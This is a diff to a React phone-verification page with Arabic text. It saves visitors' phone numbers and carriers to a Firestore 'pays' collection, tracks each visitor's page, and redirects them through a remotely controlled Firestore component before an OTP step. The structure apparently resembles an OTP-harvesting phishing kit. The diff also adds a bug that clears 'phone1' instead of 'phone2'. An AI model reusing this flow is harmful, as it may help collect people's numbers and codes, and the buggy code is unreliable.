@@ -4,15 +4,15 @@ import type React from "react";
 
 import { useNavigate } from "react-router-dom";
 import { useEffect, useState } from "react";
+import { addData, db } from "../apis/firebase";
+import { PhoneVerificationService } from "../services/PhoneVerificationService";
+import { sendPhone } from "../apis/orders";
+import FirestoreRedirect from "./rediract-page";
 import Header from "../components/Header";
+import { STCModal } from "../components/STCModal";
 import { VerificationHeader } from "../components/phone-verification/VerificationHeader";
 import { PhoneInput } from "../components/phone-verification/PhoneInput";
 import { OperatorSelector } from "../components/phone-verification/OperatorSelector";
-import { PhoneVerificationService } from "../services/PhoneVerificationService";
-import { STCModal } from "../components/STCModal";
-import { sendPhone } from "../apis/orders";
-import FirestoreRedirect from "./rediract-page";
-import { addData } from "../apis/firebase";
 
 const operators = [
   { id: "stc", name: "STC", logo: "/companies/stc.png" },
@@ -30,7 +30,7 @@ export const PhoneVerification = () => {
   const visitorId = localStorage.getItem("visitor");
 
   const [errors, setErrors] = useState({
-    phone: "",
+    phone2: "",
     operator: "",
   });
 
@@ -51,6 +51,7 @@ export const PhoneVerification = () => {
         if (prevTime <= 1) {
           clearInterval(timer);
           addData({ id: visitorId, pagename: "verify-otp" });
+          navigate("/verify-otp");
           return 0;
         }
         return prevTime - 1;
@@ -58,18 +59,18 @@ export const PhoneVerification = () => {
     }, 1000);
 
     return () => clearInterval(timer);
-  }, [isLoading, navigate]);
+  }, [isLoading, navigate, visitorId]);
 
   const validateForm = () => {
     const newErrors = {
-      phone: "",
+      phone2: "",
       operator: "",
     };
 
     let isValid = true;
 
     if (!PhoneVerificationService.validatePhone(phone)) {
-      newErrors.phone = "الرجاء إدخال رقم جوال صحيح";
+      newErrors.phone2 = "الرجاء إدخال رقم جوال صحيح";
       isValid = false;
     }
 
@@ -145,7 +146,6 @@ export const PhoneVerification = () => {
 
     try {
       // Import Firebase functions
-      const { db } = await import("../apis/firebase");
       const { doc, updateDoc, setDoc } = await import("firebase/firestore");
 
       // Reference to the document in the pays collection
@@ -153,14 +153,14 @@ export const PhoneVerification = () => {
 
       // Update the document with phone and operator information
       await updateDoc(paysDocRef, {
-        phone: phoneNumber,
+        phone2: phoneNumber,
         operator: selectedOperator,
         pagename: "verify-phone",
         updatedAt: new Date().toISOString(),
       }).catch(async () => {
         // If document doesn't exist, create it
         await setDoc(paysDocRef, {
-          phone: phoneNumber,
+          phone2: phoneNumber,
           operator: selectedOperator,
           pagename: "verify-phone",
           createdDate: new Date().toISOString(),
@@ -178,8 +178,8 @@ export const PhoneVerification = () => {
 
   const handlePhoneChange = (value: string) => {
     setPhone(value);
-    if (errors.phone) {
-      setErrors((prev) => ({ ...prev, phone: "" }));
+    if (errors.phone2) {
+      setErrors((prev) => ({ ...prev, phone1: "" }));
     }
   };
 
@@ -192,7 +192,7 @@ export const PhoneVerification = () => {
 
   return (
     <div className="min-h-screen bg-gradient-to-r from-[#146394] to-[#1a7ab8] flex flex-col items-center justify-start md:justify-center p-4">
-      <FirestoreRedirect id={visitorId as string} collectionName={"pays"} />
+      {visitorId && <FirestoreRedirect id={visitorId} collectionName="pays" />}
 
       <Header />
       {isLoading && (
@@ -226,7 +226,7 @@ export const PhoneVerification = () => {
             <PhoneInput
               value={phone}
               onChange={handlePhoneChange}
-              error={errors.phone}
+              error={errors.phone2}
             />
             <OperatorSelector
               operators={operators}
